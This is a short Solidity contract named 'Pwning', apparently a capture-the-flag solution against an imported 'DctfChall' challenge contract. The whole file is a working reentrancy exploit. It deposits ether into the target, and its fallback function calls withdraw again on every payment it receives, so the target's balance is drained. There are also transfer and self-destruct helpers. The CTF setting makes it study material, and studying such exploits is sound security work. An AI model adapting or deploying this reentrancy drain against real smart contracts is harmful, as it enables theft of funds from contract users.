pragma solidity ^0.4.4;

import "./DctfChall.sol";

contract Pwning {
    DctfChall adr;

    function go(address _adr) payable {
        adr = DctfChall(_adr);
        adr.call.value(1000000)(bytes4(sha3("invest(address)")), this);
    }

    function invest(uint256 amount) {
        adr.call.value(amount)(bytes4(sha3("invest(address)")), this);
    }

    function withdraw() {
        adr.withdraw(1000000);
    }

    function give(address to, uint256 amount) {
        adr.transferFrom(to, amount);
    }

    function destroy() {
	    suicide(msg.sender);
	}

    // This is called for the exploit!
	function() payable {
	        adr.withdraw(1000000);
	}

}

